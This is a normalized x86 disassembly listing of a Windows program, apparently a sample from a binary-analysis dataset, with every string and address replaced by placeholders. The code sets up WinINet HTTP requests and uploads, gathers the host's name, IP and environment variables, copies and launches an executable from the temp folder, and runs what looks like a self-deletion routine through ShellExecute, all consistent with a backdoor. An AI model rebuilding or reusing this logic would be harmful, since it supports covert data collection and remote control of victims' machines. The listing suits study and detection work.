sub_401000
push ecx
mov al [ esp + 0x3 ]
mov edx ecx
push ebx
push esi
mov [ edx + 0x14 ] al
xor eax eax
push edi
mov [ edx + 0x18 ] eax
mov [ edx + 0x1c ] eax
mov [ edx + 0x20 ] eax
mov edi rw-data
or ecx 0xffffffff
mov [ edx ] r--data
mov [ edx + 0x4 ] eax
mov [ edx + 0x8 ] eax
mov [ edx + 0xc ] eax
mov [ edx + 0x8028 ] eax
mov [ edx + 0x802c ] eax
mov [ edx + 0x9034 ] eax
mov [ edx + 0x8030 ] 0x1
[ edi ]
not ecx
sub edi ecx
lea ebx [ edx + 0x8831 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
mov ecx 0x1000
lea edi [ edx + 0x28 ]
[ edi ]
mov ecx 0x1000
lea edi [ edx + 0x4028 ]
[ edi ]
mov ecx 0x200
lea edi [ edx + 0x8031 ]
[ edi ]
pop edi
pop esi
mov eax edx
pop ebx
pop ecx
retn
sub_4010c0
push ebx
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x8028 ]
mov [ esi ] r--data
cmp eax ebx
je r-xdata
mov [ esi + 0x802c ] ebx
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi + 0x8028 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
pop esi
pop ebx
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_405390
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
pop esi
pop ebx
retn
sub_401130
push ebp
mov ebp esp
push 0xffffffff
push sub_405580
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc58
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x157 ]
mov [ ebp - 0x158 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x25b ]
mov [ ebp - 0x25c ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x35f ]
mov [ ebp - 0x360 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x463 ]
mov [ ebp - 0x464 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x1ff
xor eax eax
lea edi [ ebp - 0xc63 ]
mov [ ebp - 0xc64 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x54 ]
[ edi ]
lea eax [ ebp - 0x158 ]
lea ecx [ ebp - 0x464 ]
mov [ ebp - 0x50 ] eax
mov eax 0x104
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x360 ]
lea eax [ ebp - 0x54 ]
lea edx [ ebp - 0x25c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
mov [ ebp - 0x38 ] edx
push 0x0
lea edx [ ebp - 0xc64 ]
push 0x0
push ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x54 ] 0x3c
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] 0x800
call [ InternetCrackUrlA@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x28 ]
or ecx 0xffffffff
xor eax eax
mov [ ebp + 0x8 ] edi
[ edi ]
not ecx
dec ecx
lea ebx [ esi + 0x14 ]
mov edi ecx
cmp edi 0xfffffffd
mov [ ebp - 0x18 ] edi
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebx + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
call [ std::_Xlen@IAT ]
cmp edi edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
cmp eax edi
jae r-xdata
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x50 ]
mov edi [ strncmp@IAT ]
push 0x5
and edx 0xffff
push rw-data
push eax
mov [ esi + 0x24 ] edx
call edi
add esp 0xc
test eax eax
jne r-xdata
cmp edi edx
jne r-xdata
mov ecx [ ebp - 0x50 ]
push 0x4
push rw-data
push ecx
call edi
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x10 ] 0x1
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov ecx edi
mov edi [ ebx + 0x4 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ ebp - 0x18 ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
mov esi [ ebp - 0x14 ]
mov [ ebx + 0x8 ] eax
mov [ ecx + eax ] 0x0
push edi
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Copy@IAT ]
dec al
mov [ ecx - 0x1 ] al
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ InternetOpenA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call ebx
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
mov [ esi + 0x10 ] eax
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
mov ecx [ esi + 0x4 ]
mov edi [ InternetConnectA@IAT ]
push 0x0
push __dos_header
push 0x3
push 0x0
push 0x0
push edx
push eax
push ecx
call edi
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
push 0x2710
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call ebx
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x2710
call [ Sleep@IAT ]
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
mov ecx [ esi + 0x8 ]
push 0x0
push __dos_header
push 0x3
push 0x0
push 0x0
push edx
push eax
push ecx
call edi
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ esi + 0x4 ]
push edx
call [ InternetCloseHandle@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40132d
mov esi [ ebp - 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
push edi
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x8 ] edi
mov eax r-xdata
retn
push edi
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x4 ] edi
sub_401450
push ebp
mov ebp esp
push 0xffffffff
push sub_405590
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
xor eax eax
push rw-data
push ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call sub_401130
mov edi eax
test edi edi
mov [ ebp - 0x14 ] edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
mov ecx esi
push edx
push ebx
call sub_401520
dec eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0xc ] edi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
push ebx
mov ecx esi
call sub_4016d0
jmp r-xdata
dec eax
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx esi
push eax
push ebx
call sub_4018c0
jmp r-xdata
sub_401520
sub esp 0x14
push ebx
push ebp
push esi
mov esi ecx
xor ecx ecx
push edi
mov eax [ esi + 0x8 ]
mov [ esp + 0x14 ] ecx
cmp eax ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] rw-data
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x8
cmp eax 0xffffffff
je r-xdata
mov ebx [ InternetQueryOptionA@IAT ]
mov ebp [ InternetSetOptionA@IAT ]
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
or eax 0x200000
mov edx [ esp + 0x2c ]
push 0x0
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esi + 0x8 ]
push edx
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ esi + 0xc ] edx
je r-xdata
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
cmp edx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x80000000
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
je r-xdata
lea edx [ esi + 0x28 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edx [ esi + 0xc ]
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x10000000
push ecx
mov ecx [ esi + 0xc ]
push edx
push ecx
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2f0d
jne r-xdata
mov eax [ esp + 0x18 ]
inc eax
cmp eax 0x2
mov [ esp + 0x18 ] eax
jge r-xdata
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x2
mov [ esp + 0x14 ] eax
jge r-xdata
mov edx [ esi + 0xc ]
push edx
call [ InternetCloseHandle@IAT ]
jmp r-xdata
mov edx [ esi + 0xc ]
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x1f
push edx
mov [ esp + 0x30 ] 0x4
call ebx
mov eax [ esp + 0x10 ]
mov ecx [ esi + 0xc ]
or eax 0x180
push 0x4
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push 0x1f
push ecx
call ebp
jmp r-xdata
mov eax [ esi + 0x10 ]
mov cl [ esi + 0x8030 ]
dec eax
neg eax
sbb eax eax
and eax 0xff800000
add eax 0x800000
or eax 0x4400000
test cl cl
jne r-xdata
sub_4016d0
sub esp 0x14
push ebx
push ebp
push esi
mov esi ecx
xor ecx ecx
push edi
mov eax [ esi + 0x8 ]
mov [ esp + 0x14 ] ecx
cmp eax ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] rw-data
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x8
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x8028 ] ecx
je r-xdata
cmp [ esi + 0x802c ] ecx
je r-xdata
mov ebp [ InternetQueryOptionA@IAT ]
xor eax eax
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
or eax 0x200000
push 0x0
push eax
mov eax [ esp + 0x34 ]
lea edx [ esp + 0x24 ]
push edx
push eax
push rw-data
push ecx
mov ecx [ esi + 0x8 ]
push rw-data
push ecx
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ esi + 0xc ] edx
je r-xdata
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
cmp edx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov ebx [ HttpAddRequestHeadersA@IAT ]
[ edi ]
not ecx
dec ecx
push 0x80000000
push ecx
push rw-data
push edx
call ebx
test eax eax
je r-xdata
lea edx [ esi + 0x28 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
lea ebx [ esi + 0x8831 ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x10000000
push ecx
push edx
mov edx [ esi + 0xc ]
push edx
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn 0x8
mov edi [ GetLastError@IAT ]
call edi
cmp eax 0x2f88
je r-xdata
call edi
cmp eax 0x2f0d
jne r-xdata
mov eax [ esp + 0x18 ]
inc eax
cmp eax 0x2
mov [ esp + 0x18 ] eax
jge r-xdata
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x2
mov [ esp + 0x14 ] eax
jge r-xdata
mov edx [ esi + 0xc ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax 0x180
jmp r-xdata
mov edx [ esi + 0xc ]
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x1f
push edx
mov [ esp + 0x30 ] 0x4
call ebp
mov eax [ esp + 0x10 ]
mov ecx [ esi + 0xc ]
or eax 0x180
push 0x4
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push 0x1f
push ecx
call [ InternetSetOptionA@IAT ]
jmp r-xdata
mov ecx [ esi + 0x10 ]
dec ecx
neg ecx
sbb ecx ecx
and ecx 0xff800000
add ecx 0x800000
or ecx 0x4400040
or eax ecx
mov cl [ esi + 0x8030 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x802c ]
mov ecx [ esi + 0x8028 ]
push eax
push ecx
mov edi ebx
or ecx 0xffffffff
xor eax eax
mov edx [ esi + 0xc ]
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push edx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
sub_4018c0
sub esp 0x844
push ebx
push ebp
push esi
mov esi ecx
xor ecx ecx
push edi
mov eax [ esi + 0x8 ]
mov [ esp + 0x10 ] 0x1
cmp eax ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn 0x8
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x8028 ] ecx
je r-xdata
cmp [ esi + 0x802c ] ecx
je r-xdata
mov ebp [ HttpAddRequestHeadersA@IAT ]
mov ebx [ InternetQueryOptionA@IAT ]
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
or eax 0x200000
mov edx [ esp + 0x85c ]
push 0x0
push eax
lea eax [ esp + 0x28 ]
push eax
mov eax [ esi + 0x8 ]
push edx
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ esi + 0xc ] edx
je r-xdata
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
cmp edx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x80000000
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call ebp
test eax eax
je r-xdata
lea edx [ esi + 0x8831 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x10000000
push ecx
mov ecx [ esi + 0xc ]
push edx
push ecx
call ebp
test eax eax
je r-xdata
lea edx [ esi + 0x28 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov ax [ rw-data ]
mov ecx 0x1ff
mov [ esp + 0x54 ] ax
xor eax eax
lea edi [ esp + 0x56 ]
lea edx [ esp + 0x54 ]
[ edi ]
mov ecx [ esi + 0x802c ]
push ecx
push rw-data
push edx
stosw [ edi ]
call [ sprintf@IAT ]
lea edi [ esp + 0x60 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
push 0x10000000
push ecx
mov ecx [ esi + 0xc ]
lea eax [ esp + 0x5c ]
push eax
push ecx
call ebp
test eax eax
je r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x10000000
push ecx
push edx
mov edx [ esi + 0xc ]
push edx
call ebp
test eax eax
je r-xdata
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x844
retn 0x8
mov ecx 0xa
xor eax eax
lea edi [ esp + 0x2c ]
[ edi ]
xor edi edi
mov [ esp + 0x2c ] 0x28
mov [ esp + 0x30 ] edi
mov edx [ esi + 0x802c ]
mov eax [ esi + 0x8028 ]
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ esi + 0xc ]
push edx
push eax
push ecx
call [ InternetWriteFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2f0d
jne r-xdata
mov [ esp + 0x10 ] edi
mov edx [ esi + 0xc ]
push edi
push 0x8
push edi
push edx
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
inc eax
cmp eax 0x2
mov [ esp + 0x1c ] eax
jge r-xdata
mov eax [ esp + 0x18 ]
inc eax
cmp eax 0x2
mov [ esp + 0x18 ] eax
jge r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x844
retn 0x8
mov eax [ esi + 0xc ]
push eax
call [ InternetCloseHandle@IAT ]
jmp r-xdata
mov eax [ esi + 0xc ]
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
push 0x1f
push eax
mov [ esp + 0x38 ] 0x4
call ebx
mov ecx [ esp + 0x14 ]
mov edx [ esi + 0xc ]
or ecx 0x180
push 0x4
mov [ esp + 0x18 ] ecx
lea ecx [ esp + 0x18 ]
push ecx
push 0x1f
push edx
call [ InternetSetOptionA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
mov cl [ esi + 0x8030 ]
dec eax
neg eax
sbb eax eax
and eax 0xff800000
add eax 0x800000
or eax 0x4400040
test cl cl
jne r-xdata
mov eax [ esi + 0xc ]
push edi
push 0x8
lea edx [ esp + 0x34 ]
push edi
push edx
push eax
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
sub_401b90
push ecx
mov eax [ ecx + 0xc ]
mov [ esp ] 0x0
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
lea ecx [ esp ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push ecx
push eax
call [ InternetReadFile@IAT ]
mov ecx [ esp ]
neg eax
sbb eax eax
and eax ecx
pop ecx
retn 0x8
pop ecx
retn 0x8
sub_401bd0
sub esp 0x80c
push esi
mov esi ecx
push edi
mov ecx 0x1ff
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] 0x4000
[ edi ]
mov ecx [ esi + 0xc ]
stosw [ edi ]
stosb [ edi ]
mov eax 0x800
test ecx ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x8 ] eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x80c
retn
cmp ecx 0xffffffff
je r-xdata
mov edi [ HttpQueryInfoA@IAT ]
lea edx [ esp + 0x10 ]
lea eax [ esi + 0x4028 ]
push 0x0
push edx
push eax
push 0x16
push ecx
mov [ eax ] 0x0
call edi
test eax eax
jne r-xdata
mov edx [ esi + 0xc ]
lea ecx [ esp + 0x8 ]
lea eax [ esi + 0x8031 ]
push 0x0
push ecx
push eax
push 0x21
push edx
mov [ eax ] 0x0
call edi
mov edx [ esi + 0xc ]
lea eax [ esp + 0xc ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
push 0x5
push edx
call edi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x80c
retn
lea eax [ esp + 0x14 ]
push eax
call [ atoi@IAT ]
add esp 0x4
mov [ esi + 0x9034 ] eax
sub_401ca0
push esi
mov esi ecx
push edi
mov edi [ InternetCloseHandle@IAT ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
push esi
call edi
sub_401cd0
sub esp 0x190
lea eax [ esp ]
push ebx
push esi
push edi
push eax
push 0x101
call WSAStartup
mov esi [ esp + 0x1a0 ]
push 0x80
push esi
call gethostname
test eax eax
jne r-xdata
mov ebx [ getenv@IAT ]
push rw-data
call ebx
mov edi eax
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x1b4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call ebx
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x1a8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x190
retn
push esi
call gethostbyname
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x1a4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_401da0
sub esp 0x5c
mov ecx 0x14
push esi
mov esi [ InternetQueryOptionA@IAT ]
mov [ esp + 0x4 ] ecx
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x4 ]
push edi
mov eax 0x5
lea edx [ esp + 0x14 ]
push ecx
mov [ esp + 0x38 ] eax
mov [ esp + 0x20 ] eax
push edx
lea eax [ esp + 0x30 ]
push 0x4b
push 0x0
mov [ esp + 0x38 ] 0x4
mov [ esp + 0x50 ] 0x1
mov [ esp + 0x5c ] 0x3
mov [ esp + 0x68 ] 0x2
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] eax
call esi
mov edi [ printf@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x2c ]
test ecx ecx
je r-xdata
call [ GetLastError@IAT ]
push eax
push rw-data
call edi
add esp 0x8
mov eax [ esp + 0x44 ]
mov edx eax
and edx 0x4
cmp dl 0x4
jne r-xdata
push ecx
push rw-data
call edi
mov ecx [ esp + 0x34 ]
add esp 0x8
mov ecx eax
and ecx 0x8
cmp cl 0x8
jne r-xdata
mov eax [ esp + 0x68 ]
push ecx
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
mov ecx eax
and ecx 0x2
cmp cl 0x2
jne r-xdata
mov edx [ esp + 0x68 ]
push rw-data
push edx
jmp r-xdata
lea edx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push edx
push eax
push 0x28
push 0x0
mov [ esp + 0x18 ] 0x8
call esi
mov eax [ esp + 0x2c ]
mov esi [ GlobalFree@IAT ]
test eax eax
je r-xdata
and eax 0x1
cmp al 0x1
jne r-xdata
mov edx [ esp + 0x5c ]
mov eax [ esp + 0x68 ]
push edx
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
call [ sprintf@IAT ]
add esp 0x8
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call esi
mov ecx [ esp + 0x68 ]
push rw-data
push ecx
mov eax [ esp + 0x5c ]
test eax eax
je r-xdata
push eax
call esi
pop edi
pop esi
add esp 0x5c
retn
push eax
call esi
sub_401f00
sub esp 0x364
push ebx
push esi
push edi
push 0xfffffff5
call [ GetStdHandle@IAT ]
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x20 ]
[ edi ]
lea eax [ esp + 0x20 ]
push eax
call [ GetStartupInfoA@IAT ]
lea edx [ esp + 0x26c ]
push 0x104
mov eax [ esp + 0x378 ]
push edx
mov [ esp + 0x28 ] 0x44
mov [ esp + 0x54 ] 0x101
mov ecx [ eax ]
mov eax [ eax + 0xc ]
mov [ esp + 0x60 ] ecx
mov [ esp + 0x68 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x58 ] 0x0
call [ GetSystemDirectoryA@IAT ]
lea edi [ esp + 0x26c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x168 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x168 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x64 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push 0x104
call [ GetTempPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x64 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push eax
lea eax [ esp + 0x68 ]
lea ecx [ esp + 0x16c ]
push eax
push ecx
call [ CopyFileA@IAT ]
xor edx edx
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] edx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] edx
push eax
mov [ esp + 0x1c ] edx
push ecx
push edx
push edx
push edx
push 0x1
push edx
mov [ esp + 0x38 ] edx
push edx
lea edx [ esp + 0x84 ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov esi [ Sleep@IAT ]
push 0x64
mov [ rw-data ] 0x1
call esi
mov edi [ CloseHandle@IAT ]
mov eax [ esp + 0x14 ]
push eax
call edi
mov ebx [ GetExitCodeProcess@IAT ]
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x364
retn 0x4
mov eax [ esp + 0x10 ]
push eax
call edi
lea ecx [ esp + 0x64 ]
push ecx
call [ DeleteFileA@IAT ]
pop edi
pop esi
mov [ rw-data ] 0x0
xor eax eax
pop ebx
add esp 0x364
retn 0x4
cmp [ esp + 0xc ] 0x103
jne r-xdata
push 0x7530
call esi
jmp r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0xc ]
push ecx
push edx
call ebx
test eax eax
je r-xdata
sub_4020e0
push esi
call [ AllocConsole@IAT ]
mov eax [ _iob@IAT ]
mov esi [ freopen@IAT ]
add eax 0x20
push eax
push rw-data
push rw-data
call esi
mov ecx [ _iob@IAT ]
push ecx
push rw-data
push rw-data
call esi
add esp 0x18
pop esi
retn
sub_402120
sub esp 0x208
lea eax [ esp ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x208
retn
lea ecx [ esp ]
push 0x104
lea edx [ esp + 0x4 ]
push ecx
push edx
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
push esi
lea eax [ esp + 0x108 ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x108 ]
push ecx
push edx
call esi
lea eax [ esp + 0x108 ]
push rw-data
push eax
call esi
lea ecx [ esp + 0x4 ]
push 0x104
push ecx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
pop esi
je r-xdata
push 0x0
lea edx [ esp + 0x108 ]
push 0x0
lea eax [ esp + 0x8 ]
push edx
push eax
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
cmp eax 0x20
jle r-xdata
mov eax 0x1
add esp 0x208
retn
sub_4021e0
push ebx
push esi
push edi
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
mov edi [ esp + 0x18 ]
mov ebx [ rand@IAT ]
